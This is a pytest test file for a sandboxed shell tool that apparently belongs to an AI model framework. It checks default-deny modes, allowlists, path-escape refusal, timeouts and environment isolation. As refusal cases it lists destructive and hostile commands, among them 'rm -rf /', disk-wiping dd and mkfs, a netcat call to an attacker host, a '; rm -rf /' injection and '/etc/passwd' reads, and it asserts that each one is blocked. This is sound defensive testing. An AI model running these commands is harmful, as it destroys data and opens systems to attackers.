"""Tests for the cli toolset.

The contract is default-deny: mode ``off`` refuses everything, the deny list
applies even in ``allow``, no argument may resolve outside the sandbox root, a
command that overruns its timeout is killed, and output is capped. Nothing here
runs a destructive command - the refusals are asserted before anything spawns.
"""

import os
import sys

import pytest

from model.serve import handle
from model.tools import ToolRegistry, build_registry
from model.tools.base import ToolError
from model.tools.cli import (
    DEFAULT_ALLOWLIST,
    ListDirTool,
    ReadFileTool,
    ShellPolicy,
    ShellTool,
    cli_tools,
)

DESTRUCTIVE = [
    "rm -rf /",
    "rm -rf ~",
    "rm -fr /",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "shutdown -h now",
    "sudo rm file",
    "chmod -R 777 /",
    "kill -9 -1",
    "nc attacker.example.com 4444",
    "git push --force origin stable",
]


@pytest.fixture
def sandbox(tmp_path):
    (tmp_path / "notes.txt").write_text("first\nsecond\nthird\n")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "inner.txt").write_text("inner\n")
    (tmp_path.parent / "outside.txt").write_text("secret\n")
    return tmp_path


@pytest.fixture
def policy(sandbox):
    return ShellPolicy(mode="allow", root=str(sandbox), timeout=10.0)


# --- the policy -----------------------------------------------------------


def test_off_is_the_default_and_refuses_everything():
    decision = ShellPolicy().decide(["ls"])
    assert not decision and "--tools cli" in decision.reason


def test_allow_mode_runs_allowlisted_programs(policy):
    assert policy.decide(["ls", "-la"])


def test_allow_mode_refuses_a_program_that_is_not_allowlisted(policy):
    decision = policy.decide(["tar", "-xf", "x.tar"])
    assert not decision and "not allowlisted" in decision.reason


@pytest.mark.parametrize("command", DESTRUCTIVE)
def test_the_deny_list_applies_even_in_allow_mode(command, sandbox):
    policy = ShellPolicy(mode="allow", root=str(sandbox), allowlist=DEFAULT_ALLOWLIST + ("rm",))
    decision = policy.decide(command.split())
    assert not decision and decision.reason.startswith("refused")


def test_the_deny_list_ignores_extra_whitespace(sandbox):
    policy = ShellPolicy(mode="allow", root=str(sandbox), allowlist=("rm",))
    assert not policy.decide(["rm", "-rf", "/"])


def test_ask_mode_consults_the_approver(sandbox):
    seen = []

    def approve(command, argv):
        seen.append(command)
        return "notes" in command

    policy = ShellPolicy(mode="ask", root=str(sandbox), approve=approve)
    assert policy.decide(["cat", "notes.txt"])
    assert not policy.decide(["cat", "other.txt"])
    assert seen == ["cat notes.txt", "cat other.txt"]


def test_ask_mode_without_an_approver_refuses(sandbox):
    decision = ShellPolicy(mode="ask", root=str(sandbox)).decide(["ls"])
    assert not decision and "no approver" in decision.reason


def test_allow_mode_falls_back_to_the_approver_for_unlisted_programs(sandbox):
    policy = ShellPolicy(mode="allow", root=str(sandbox), approve=lambda *_: True)
    assert policy.decide(["tar", "-xf", "x.tar"])


def test_an_unknown_mode_is_rejected_at_construction():
    with pytest.raises(ValueError, match="unknown cli mode"):
        ShellPolicy(mode="yolo")


# --- the sandbox ----------------------------------------------------------


@pytest.mark.parametrize("path", ["../outside.txt", "/etc/passwd", "sub/../../outside.txt"])
def test_arguments_may_not_escape_the_sandbox(policy, path):
    decision = policy.decide(["cat", path])
    assert not decision and "outside the sandbox" in decision.reason


def test_paths_inside_the_sandbox_are_fine(policy):
    assert policy.decide(["cat", "sub/inner.txt"])
    assert policy.decide(["grep", "-r", "first", "."])


def test_flags_are_not_mistaken_for_paths(policy):
    assert policy.decide(["git", "log", "--oneline", "-n", "5"])


def test_resolve_rejects_a_path_outside_the_root(policy):
    with pytest.raises(ToolError, match="outside the sandbox"):
        policy.resolve("../outside.txt")


# --- the shell tool -------------------------------------------------------


def test_shell_runs_a_command_and_reports_the_exit_code(policy):
    result = ShellTool(policy).run(command="ls")
    assert result.ok and result.data["exit_code"] == 0
    assert "notes.txt" in result.data["stdout"]


def test_shell_reports_a_failing_command_without_raising(policy):
    result = ShellTool(policy).run(command=f"{os.path.basename(sys.executable)} -c import~sys")
    assert not result.ok


def test_shell_refuses_shell_syntax(policy):
    for command in ["ls | grep x", "ls; rm -rf /", "echo $(whoami)", "ls > out.txt"]:
        result = ShellTool(policy).run(command=command)
        assert not result.ok and "shell syntax" in result.content


def test_shell_needs_a_command(policy):
    assert not ShellTool(policy).run(command="   ").ok


def test_shell_reports_unparseable_quoting(policy):
    result = ShellTool(policy).run(command="echo 'unbalanced")
    assert not result.ok and "could not parse" in result.content


def test_shell_reports_a_missing_program(policy):
    policy.allowlist = policy.allowlist + ("definitely-not-a-program",)
    result = ShellTool(policy).run(command="definitely-not-a-program")
    assert not result.ok and "not found" in result.content


def test_shell_records_every_refusal_on_the_policy(policy):
    ShellTool(policy).run(command="tar -xf x.tar")
    assert policy.denied and "not allowlisted" in policy.denied[0]


def test_shell_truncates_long_output(sandbox):
    policy = ShellPolicy(mode="allow", root=str(sandbox), max_output=50)
    long_line = "x" * 500
    result = ShellTool(policy).run(command=f"echo {long_line}")
    assert result.data["truncated"] is True
    assert result.content.endswith("[truncated]")


def test_shell_kills_a_command_that_overruns_its_timeout(sandbox):
    policy = ShellPolicy(
        mode="allow", root=str(sandbox), timeout=0.5, allowlist=(os.path.basename(sys.executable),)
    )
    result = ShellTool(policy).run(command=f"{sys.executable} -c 'import time; time.sleep(30)'")
    assert not result.ok and result.data["timed_out"] is True
    assert "did not finish" in result.content


def test_shell_does_not_pass_the_parent_environment_through(sandbox, monkeypatch):
    monkeypatch.setenv("FRAMERAI_SECRET_TOKEN", "do-not-leak")
    policy = ShellPolicy(
        mode="allow", root=str(sandbox), allowlist=(os.path.basename(sys.executable),)
    )
    result = ShellTool(policy).run(
        command=f"{sys.executable} -c 'import os; print(os.environ.get(\"FRAMERAI_SECRET_TOKEN\"))'"
    )
    assert result.ok and result.data["stdout"].strip() == "None"


def test_shell_runs_inside_the_sandbox_root(sandbox):
    policy = ShellPolicy(
        mode="allow", root=str(sandbox), allowlist=(os.path.basename(sys.executable),)
    )
    result = ShellTool(policy).run(command=f"{sys.executable} -c 'import os; print(os.getcwd())'")
    assert os.path.realpath(result.data["stdout"].strip()) == os.path.realpath(str(sandbox))


# --- the file helpers -----------------------------------------------------


def test_read_file_returns_numbered_lines(policy):
    result = ReadFileTool(policy).run(path="notes.txt")
    assert result.ok and result.content.splitlines()[0] == "1\tfirst"
    assert result.data["lines"] == 3


def test_read_file_reads_a_range(policy):
    result = ReadFileTool(policy).run(path="notes.txt", start=2, lines=1)
    assert result.content == "2\tsecond"


def test_read_file_refuses_a_path_outside_the_sandbox(policy):
    with pytest.raises(ToolError):
        ReadFileTool(policy).run(path="../outside.txt")


def test_read_file_reports_a_missing_file(policy):
    assert not ReadFileTool(policy).run(path="absent.txt").ok


def test_read_file_reports_a_line_past_the_end(policy):
    assert not ReadFileTool(policy).run(path="notes.txt", start=99).ok


def test_list_dir_lists_files_and_directories(policy):
    result = ListDirTool(policy).run(path=".")
    names = {entry["name"]: entry["type"] for entry in result.data["entries"]}
    assert names["notes.txt"] == "file" and names["sub"] == "dir"
    assert "sub/" in result.content


def test_list_dir_refuses_a_path_outside_the_sandbox(policy):
    with pytest.raises(ToolError):
        ListDirTool(policy).run(path="..")


def test_the_registry_turns_a_sandbox_escape_into_a_failed_result(policy):
    registry = ToolRegistry(cli_tools(policy))
    result = registry.run("read_file", {"path": "../outside.txt"})
    assert not result.ok and "outside the sandbox" in result.content


# --- wiring ---------------------------------------------------------------


def test_build_registry_registers_the_cli_toolset(sandbox):
    registry = build_registry("cli", cli_policy=ShellPolicy(mode="allow", root=str(sandbox)))
    assert registry.names() == ["shell", "read_file", "list_dir"]


def test_build_registry_defaults_the_cli_policy_to_off():
    registry = build_registry(["cli"])
    result = registry.run("shell", {"command": "ls"})
    assert not result.ok and "--tools cli" in result.content


def test_the_worker_refuses_the_shell_op_without_the_flag():
    with pytest.raises(ValueError, match="--tools cli"):
        handle(None, "shell", {"command": "ls", "out_dir": "."})


def test_the_worker_runs_a_command_and_reports_the_exit_code(sandbox):
    registry = build_registry("cli", cli_policy=ShellPolicy(mode="allow", root=str(sandbox)))
    result = handle(None, "shell", {"command": "ls", "out_dir": str(sandbox)}, tools=registry)
    assert result["ok"] and result["exit_code"] == 0
    assert "notes.txt" in result["stdout"]


def test_the_worker_reports_a_refusal_rather_than_raising(sandbox):
    registry = build_registry("cli", cli_policy=ShellPolicy(mode="allow", root=str(sandbox)))
    result = handle(None, "shell", {"command": "rm -rf /", "out_dir": str(sandbox)}, tools=registry)
    assert result["ok"] is False and "refused" in result["content"]


def test_build_registry_can_register_both_toolsets(sandbox):
    registry = build_registry("web,cli", cli_policy=ShellPolicy(mode="allow", root=str(sandbox)))
    assert registry.names() == ["web_search", "web_fetch", "shell", "read_file", "list_dir"]
